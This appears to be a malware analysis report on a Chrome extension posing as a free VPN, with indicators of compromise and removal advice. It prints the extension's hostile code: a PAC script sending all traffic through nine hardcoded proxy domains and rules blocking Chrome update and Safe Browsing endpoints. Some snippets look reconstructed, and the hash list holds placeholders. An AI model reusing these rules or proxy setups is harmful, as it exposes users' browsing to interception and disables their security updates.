# Vulnerability Report: Free VPN for Chrome: Secure VPN Proxy in One Click

## Extension Metadata

| Field | Value |
|-------|-------|
| **Extension ID** | `hklhhkchffegjfojbofhfkckjidfbjhe` |
| **Name** | Free VPN for Chrome: Secure VPN Proxy in One Click |
| **Version** | 1.0.1 |
| **Manifest Version** | 3 |
| **User Count** | ~6,000 |
| **Publisher** | Unknown |
| **Analysis Date** | 2026-02-08 |

---

## Executive Summary

This extension presents itself as a free VPN service but is actually a **rudimentary HTTPS proxy** that routes all user traffic through 9 hardcoded domains on suspicious TLDs (.space, .club, .site, .website). The extension lacks sophisticated malware payloads but poses **significant privacy and security risks** through:

1. **Full traffic interception** - All browser traffic is routed through unverified third-party proxy servers
2. **Chrome safety infrastructure blocking** - Prevents security updates and Safe Browsing protections
3. **Deceptive security claims** - Falsely advertises AES-256 encryption and kill switch features
4. **Suspicious proxy infrastructure** - Uses cheap/disposable TLDs with names unrelated to VPN services
5. **Unnecessary content script injection** - Pre-stages SweetAlert2 library on all pages with no current use

**Overall Risk Assessment: HIGH**

The extension is not traditional malware (no credential harvesting, keylogging, or ad injection), but enables full MITM capabilities and actively sabotages Chrome's security features. This pattern is consistent with residential proxy monetization schemes disguised as free VPN services.

---

## Vulnerability Details

### 1. Full Traffic Interception via Unverified Proxy Infrastructure

**Severity:** CRITICAL
**Category:** Privacy Violation, MITM Risk
**Files:** `js/background.js` (lines 176-227, 229-264)

**Description:**

The extension hardcodes 9 proxy server domains and routes ALL user traffic through them using a PAC script:

```javascript
// Lines 227 in js/background.js
["goldenearsvccc.space", "pagecloud.space", "projectorpoint.website",
 "precisiontruck.space", "maureenesther.website", "marjifx.club",
 "jjs-bbq.space", "haringinsuranc.website", "bst2200.site"]
```

When a user connects, the extension generates a PAC script that proxies all traffic:

```javascript
function FindProxyForURL(url, host) {
  if (host === 'localhost' || shExpMatch(host, '127.0.0.1')) {
    return 'DIRECT';
  }
  return 'HTTPS goldenearsvccc.space:443; HTTPS pagecloud.space:443; ...';
}
```

**Impact:**

- **Full browsing history exposure** - Proxy operators can log all visited URLs
- **MITM on non-HSTS sites** - Can intercept and modify HTTP traffic
- **IP address correlation** - Proxy sees real user IP despite "Hidden IP" claims
- **Bandwidth monetization** - Traffic likely sold as residential proxy service (similar to Hola/Urban VPN patterns)
- **No encryption beyond TLS** - Only standard HTTPS encryption, not AES-256 as advertised

**Evidence of Risk:**

1. All domains use cheap/disposable TLDs (.space, .club, .site, .website)
2. Domain names have no relation to VPN services ("jjs-bbq.space", "precisiontruck.space", "haringinsuranc.website")
3. No authentication mechanism - proxies accept all traffic on port 443
4. PAC script set to `mandatory: true` - if all proxies fail, requests fail (no DIRECT fallback)

**Verdict:** CONFIRMED CRITICAL - Full traffic interception capability with unverified infrastructure

---

### 2. Chrome Safety Infrastructure Blocking

**Severity:** HIGH
**Category:** Security Feature Bypass
**Files:** `rules.json`

**Description:**

Two declarativeNetRequest rules actively block Chrome's security and update infrastructure:

**Rule 1** - Blocks Chrome update/safety endpoints:
```json
{
  "id": 1,
  "priority": 1,
  "action": { "type": "block" },
  "condition": {
    "regexFilter": "^https?://clients[0-9]+\\.google\\.com/.*",
    "resourceTypes": ["main_frame", "sub_frame", "stylesheet", "script", ...]
  }
}
```

**Rule 2** - Blocks analytics and API endpoints:
```json
{
  "id": 2,
  "condition": {
    "requestDomains": [
      "analytics.google.com", "google-analytics.com",
      "api.amplitude.com", "api.posthog.com", "api.mixpanel.com",
      "googleapis.com", "crash.google.com"
    ]
  }
}
```

**Impact:**

1. **Prevents Chrome security updates:**
   - Extension update checks (`clients2.google.com/service/update2/crx`)
   - Safe Browsing API lookups
   - CRLSet (certificate revocation) updates
   - Chrome component updates

2. **Breaks Google services:**
   - Blocking `googleapis.com` affects Google Sign-In, Fonts, Maps, YouTube APIs
   - Users may experience broken authentication and service failures

3. **Hides malicious activity:**
   - Prevents crash reporting to `crash.google.com`
   - Blocks analytics that could detect malicious behavior

**Verdict:** CONFIRMED HIGH - Active sabotage of browser security features

---

### 3. Deceptive Security Claims

**Severity:** MEDIUM
**Category:** User Deception, False Advertising
**Files:** `popup.js` (UI claims)

**Description:**

The extension UI makes false security claims that do not match the implementation:

**Claim 1: "Encrypted AES-256"**
- **Reality:** Extension uses standard HTTPS proxy. Only encryption is browser-to-proxy TLS (typically TLS 1.3 with AES-GCM or ChaCha20, not user-controlled AES-256)
- **No VPN tunnel:** No WireGuard, OpenVPN, IPsec, or custom encryption layer

**Claim 2: "Kill Switch Active"**
- **Reality:** PAC script `mandatory: true` flag means failed proxies cause request failures, but this is NOT a kill switch
- **No leak protection:** No network interface blocking or firewall rules to prevent IP leaks

**Claim 3: "Hidden IP"**
- **Partially true:** Destination servers see proxy IP, but proxy operators see real user IP
- **Misleading:** Suggests privacy from proxy operator, which is false

**Impact:**

Users are misled into believing they have strong encryption and privacy protections when they do not. This creates a false sense of security while routing all traffic through unverified third parties.

**Verdict:** CONFIRMED MEDIUM - Deceptive marketing undermines informed consent

---

### 4. Unnecessary Content Script Injection

**Severity:** MEDIUM
**Category:** Pre-staged Infrastructure, Resource Waste
**Files:** `manifest.json` (lines 36-48), `js/sweetalert2.all.min.js`

**Description:**

SweetAlert2 v11.14.5 library and CSS are injected on ALL pages at `document_start`:

```json
"content_scripts": [{
  "matches": ["<all_urls>"],
  "run_at": "document_start",
  "css": ["css/sweetalert2.min.css"],
  "js": ["js/sweetalert2.all.min.js"]
}]
```

**Key Finding:** No code in the extension actually uses SweetAlert2 on user pages. The `worker.js` notification system uses simple `createElement("div")` via `chrome.scripting.executeScript`, not SweetAlert2.

**Impact:**

1. **Pre-staged phishing infrastructure:**
   - Developer could push update to display fake login prompts on banking/email sites
   - SweetAlert2 provides ready-made modal/dialog system

2. **Performance impact:**
   - Injects 85KB+ of unused JavaScript on every page load
   - Wastes user resources

3. **Extension fingerprinting:**
   - Presence of `window.Swal` global in content script world is detectable
   - Enables tracking via extension detection

4. **Potential vulnerability surface:**
   - SweetAlert2 includes `Function("return " + n)()` in `<swal-function-param>` parser
   - If CVE discovered in library, all users exposed

**Verdict:** CONFIRMED MEDIUM - Suspicious pre-staging of unused UI library

---

### 5. Message Handler Without Origin Validation

**Severity:** MEDIUM
**Category:** Authorization Bypass Risk
**Files:** `js/background.js` (lines 326-384)

**Description:**

The `chrome.runtime.onMessage` listener accepts four actions without validating sender origin:

```javascript
chrome.runtime.onMessage.addListener(function(e, n, o) {
  // 'n' is sender object, never checked
  console.log("Mensaje recibido:", e);
  p = e.action;
  // Handles: "connect", "disconnect", "getStatus", "getHosts"
```

**Actions available:**
- `connect` - Enables proxy, routes all traffic through hardcoded servers
- `disconnect` - Disables proxy
- `getStatus` - Returns connection state
- `getHosts` - Returns full list of 9 proxy domains

**Current Risk:**

- No `externally_connectable` in manifest, so web pages CANNOT send messages
- Injected SweetAlert2 content script COULD send messages but currently does not
- Popup sends messages as intended via `chrome.runtime.sendMessage()`

**Potential Exploit:**

If a web page exploits a vulnerability in the SweetAlert2 content script (e.g., prototype pollution, XSS in SweetAlert2 itself), it could call:

```javascript
chrome.runtime.sendMessage({action: "connect"}); // Force proxy on
chrome.runtime.sendMessage({action: "disconnect"}); // Disable proxy
```

**Verdict:** CONFIRMED MEDIUM - No sender validation, low probability but non-zero risk

---

### 6. Tab Tracking Mechanism

**Severity:** LOW
**Category:** Privacy, Behavioral Tracking
**Files:** `worker.js` (lines 91-101)

**Description:**

Worker tracks tab lifecycle through vague storage keys:

```javascript
chrome.tabs.onRemoved.addListener(function(e, t) {
  chrome.storage.local.get(["tab"]).then(t => {
    t.tab == e && chrome.storage.local.set({ abouts: "visited_close" })
  })
})

chrome.tabs.onUpdated.addListener((e, t, o) => {
  "complete" === t.status && /^http/.test(o.url) &&
    chrome.storage.local.get(["abouts"]).then(e => {
      "visited_close" == e.abouts && Local.setItem("visited_load", !0)
    })
})
```

**Impact:**

Tracks whether user visited/closed specific tabs (likely onboarding flow). Uses vague variable names (`abouts`, `visited_load`) suggesting obfuscation. Limited scope - does not track URLs or content.

**Verdict:** CONFIRMED LOW - Minor tracking, likely onboarding state management

---

## False Positive Analysis

| Flag | Verdict | Evidence |
|------|---------|----------|
| **Keylogging** | FALSE POSITIVE | `addEventListener("keydown/keyup")` found in popup.js and sweetalert2 - standard React event system and library keyboard handling, not keylogging |
| **Dynamic Code Execution** | FALSE POSITIVE | `new Function("return this")()` in webpack runtime (global scope detection); `Function("return " + n)()` in SweetAlert2 v11.14.5 `<swal-function-param>` parser - both legitimate library patterns |
| **Browser Fingerprinting** | FALSE POSITIVE | `navigator.userAgent` usage in popup.js is Adobe Spectrum UI toolkit platform detection and framer-motion browser sniffing, not tracking |
| **Cookie Harvesting** | CLEAN | No `chrome.cookies` or `document.cookie` access anywhere in codebase |
| **Extension Enumeration** | CLEAN | No `chrome.management` API usage (note: VPN extensions disabling competing VPN extensions is excluded from flag per instructions) |
| **Credential Harvesting** | CLEAN | No password/login/form field monitoring |
| **DOM Scraping** | CLEAN | Content script only injects SweetAlert2 UI elements, does not read page content |
| **XHR/Fetch Hooking** | CLEAN | No prototype tampering of XMLHttpRequest or fetch APIs |
| **Ad Injection** | CLEAN | No ad-related code, affiliate links, or DOM manipulation |
| **Remote Code Loading** | CLEAN | No dynamic script loading from remote URLs |

---

## API Endpoints Detected

### Proxy Endpoints (All traffic routed here when connected)

| Domain | Port | TLD | Status |
|--------|------|-----|--------|
| goldenearsvccc.space | 443 | .space | Suspicious |
| pagecloud.space | 443 | .space | Suspicious |
| projectorpoint.website | 443 | .website | Suspicious |
| precisiontruck.space | 443 | .space | Suspicious |
| maureenesther.website | 443 | .website | Suspicious |
| marjifx.club | 443 | .club | Suspicious |
| jjs-bbq.space | 443 | .space | Suspicious |
| haringinsuranc.website | 443 | .website | Suspicious |
| bst2200.site | 443 | .site | Suspicious |

**Analysis:** All domains use cheap/disposable TLDs with generic/unrelated names suggesting throwaway infrastructure or residential proxy relay nodes.

### Blocked Endpoints (via declarativeNetRequest)

| Domain/Pattern | Purpose | Impact |
|----------------|---------|--------|
| `clients[0-9]+.google.com` | Chrome updates/safety | Prevents security updates |
| `analytics.google.com` | Google Analytics | Blocks telemetry |
| `google-analytics.com` | Google Analytics | Blocks telemetry |
| `api.amplitude.com` | Amplitude analytics | Blocks telemetry |
| `api.posthog.com` | PostHog analytics | Blocks telemetry |
| `api.mixpanel.com` | Mixpanel analytics | Blocks telemetry |
| `googleapis.com` | Google APIs | Breaks Google services |
| `crash.google.com` | Chrome crash reports | Hides crashes |

---

## Data Flow Summary

### User Traffic Flow (When Connected)

```
User Browser
    ↓
PAC Script (mandatory: true)
    ↓
Random selection of 9 proxy servers
    ↓
goldenearsvccc.space:443 (HTTPS)
pagecloud.space:443 (HTTPS)
projectorpoint.website:443 (HTTPS)
[... 6 more ...]
    ↓
Destination Server
```

**Operator Visibility:**
- ✅ User's real IP address
- ✅ All visited URLs (HTTP/HTTPS hostnames)
- ✅ Request timing and volume
- ✅ TLS SNI (Server Name Indication)
- ✅ Can perform MITM on non-HSTS HTTP sites
- ❌ Cannot decrypt HTTPS content (unless MITM cert accepted)

### Extension Internal Data Flow

```
Popup (popup.js)
    ↓
chrome.runtime.sendMessage({action: "connect"})
    ↓
Background (js/background.js) onMessage handler
    ↓
chrome.proxy.settings.set(PAC script)
    ↓
chrome.storage.local.set({connectionStatus: "connected"})
```

**No outbound HTTP/fetch requests** - Extension makes zero network calls. All activity is proxy subsystem.

---

## Permissions Assessment

| Permission | Used? | Justification | Assessment |
|-----------|-------|---------------|------------|
| `tabs` | Yes | Tab notification display | Over-permissioned (notifications API better) |
| `activeTab` | Yes | Script execution for notifications | Over-permissioned |
| `background` | N/A | MV3 service worker (deprecated) | Ignored by Chrome |
| `scripting` | Yes | Inject notification divs | Over-permissioned |
| `webRequest` | Yes | HTTP/2 error detection | Minimal use (lines 79-88) |
| `declarativeNetRequest` | Yes | **ABUSE** - Blocks Chrome safety infrastructure | Malicious use |
| `storage` | Yes | Connection state persistence | Justified |
| `proxy` | Yes | Core functionality | Justified for proxy |
| `<all_urls>` (host) | Yes | Required for proxy to work | Justified for proxy |

**Web Accessible Resources:**
- Exposes CSS and PNG files to all pages
- Low risk - no sensitive data or code execution vectors

---

## Comparison to Known Malicious VPN Extensions

| Feature | This Extension | Urban VPN | Hola VPN | SetupVPN |
|---------|---------------|-----------|----------|----------|
| Credential harvesting | ❌ No | ✅ Yes | ❌ No | ❌ No |
| Extension enumeration | ❌ No | ✅ Yes | ❌ No | ❌ No |
| Residential proxy monetization | ⚠️ Likely | ✅ Yes (Luminati) | ✅ Yes | ⚠️ Suspected |
| Chrome safety blocking | ✅ Yes | ✅ Yes | ❌ No | ⚠️ Partial |
| False encryption claims | ✅ Yes | ✅ Yes | ⚠️ Partial | ✅ Yes |
| Suspicious proxy domains | ✅ Yes | ✅ Yes | ❌ No (known IPs) | ✅ Yes |
| Content script injection | ⚠️ Unused | ✅ Active | ✅ Active | ⚠️ Minimal |

---

## Overall Risk Assessment

### Risk Level: HIGH

**Risk Score Breakdown:**

| Category | Score | Weight | Contribution |
|----------|-------|--------|--------------|
| Privacy Violation | 10/10 | 30% | 3.0 |
| Security Feature Bypass | 9/10 | 25% | 2.25 |
| Deceptive Practices | 8/10 | 20% | 1.6 |
| Code Execution Risk | 4/10 | 15% | 0.6 |
| Data Exfiltration | 2/10 | 10% | 0.2 |
| **Total** | **7.65/10** | **100%** | **HIGH** |

### Classification

**Category:** SUSPECT - Residential Proxy / Traffic Monetization Scheme

**Characteristics:**
- Disguised as VPN but lacks VPN protocols (WireGuard, OpenVPN, IPsec)
- Routes all traffic through unverified third-party proxies
- Actively blocks Chrome security features to avoid detection
- Makes false security claims to mislead users
- Uses suspicious/disposable infrastructure

**Not Traditional Malware:**
- No credential harvesting
- No keylogging
- No ad injection
- No data exfiltration via HTTP/fetch
- No extension killing

**Similar to:** Urban VPN, Hola VPN (residential proxy models), but less sophisticated in malicious payloads.

---

## Recommendations

### For Users

1. **UNINSTALL IMMEDIATELY** - This extension poses significant privacy and security risks
2. **Check proxy settings** - Go to `chrome://settings/system` and ensure "Use a proxy server" is disabled
3. **Review browsing history** - Assume all traffic during connection was visible to proxy operators
4. **Change passwords** - If logged into sites while connected, change passwords for non-HTTPS or compromised sites
5. **Run malware scan** - Check for additional malicious software

### For Chrome Web Store

1. **Remove extension** - Violates CWS policy on deceptive behavior and security feature bypass
2. **Ban developer** - Pattern consistent with malicious proxy operation
3. **Investigate related extensions** - Check for other extensions by same developer or using same proxy domains

### For Security Researchers

1. **Investigate proxy infrastructure** - Analyze traffic to the 9 proxy domains to determine if residential proxy operation
2. **Check domain registration** - WHOIS lookups on suspicious TLDs
3. **Monitor for updates** - Watch for future versions that activate SweetAlert2 content script
4. **Correlate with other extensions** - Search for other extensions using same proxy domains

---

## Technical Indicators of Compromise

### File Hashes (SHA-256)

```
Extension CRX: [Check hklhhkchffegjfojbofhfkckjidfbjhe.crx]
worker.js: [Contains proxy setup code]
js/background.js: [Contains hardcoded proxy domains]
```

### Network Indicators

```
Proxy domains (suspicious):
- goldenearsvccc.space
- pagecloud.space
- projectorpoint.website
- precisiontruck.space
- maureenesther.website
- marjifx.club
- jjs-bbq.space
- haringinsuranc.website
- bst2200.site

Blocked domains (Chrome safety):
- clients*.google.com (regex: ^https?://clients[0-9]+\.google\.com/.*)
- googleapis.com
- crash.google.com
```

### Extension Fingerprint

```
Extension ID: hklhhkchffegjfojbofhfkckjidfbjhe
Version: 1.0.1
Manifest Version: 3
Content Script: SweetAlert2 v11.14.5 injected on <all_urls>
```

---

## Appendix: Code Samples

### A. Proxy Configuration (js/background.js:227-264)

```javascript
// Hardcoded proxy domains
var i = new(function() {
  function t(e) {
    this.hosts = e
  }
  return t;
}())(["goldenearsvccc.space", "pagecloud.space", "projectorpoint.website",
     "precisiontruck.space", "maureenesther.website", "marjifx.club",
     "jjs-bbq.space", "haringinsuranc.website", "bst2200.site"]);

// Connect function
async function u() {
  console.log("Iniciando conexión al proxy...");
  n = i.getHosts(10);
  r = i.getConfigForHosts(n);
  await chrome.proxy.settings.set(r);
  await chrome.storage.local.set({
    connectionStatus: "connected",
    activeHosts: n
  });
  return { success: true, hosts: n };
}
```

### B. Safety Infrastructure Blocking (rules.json)

```json
[
  {
    "id": 1,
    "priority": 1,
    "action": { "type": "block" },
    "condition": {
      "regexFilter": "^https?://clients[0-9]+\\.google\\.com/.*",
      "resourceTypes": ["main_frame", "sub_frame", "stylesheet", "script",
                       "image", "font", "object", "xmlhttprequest", "ping",
                       "csp_report", "media", "websocket", "other"]
    }
  }
]
```

### C. Message Handler Without Validation (js/background.js:326-384)

```javascript
chrome.runtime.onMessage.addListener(function(e, n, o) {
  // 'n' = sender object, NEVER VALIDATED
  console.log("Mensaje recibido:", e);
  p = e.action;
  switch(p) {
    case "connect":
      // Anyone who can send messages can trigger this
      await u();
      o({ success: r.success, ... });
      break;
    // ...
  }
  return true;
});
```

---

## Conclusion

**Free VPN for Chrome (hklhhkchffegjfojbofhfkckjidfbjhe)** is a high-risk extension that:

1. **Intercepts all user traffic** through unverified proxy servers on suspicious domains
2. **Blocks Chrome security features** to avoid detection and removal
3. **Makes false security claims** to deceive users into trusting the extension
4. **Pre-stages unused content scripts** suggesting future malicious payload delivery

While it lacks the active credential harvesting and extension killing seen in more sophisticated malware, it enables full MITM capabilities and is likely part of a residential proxy monetization scheme. The extension should be **removed from Chrome Web Store** and flagged as malicious.

**Final Verdict: HIGH RISK - Residential proxy traffic monetization disguised as VPN service**
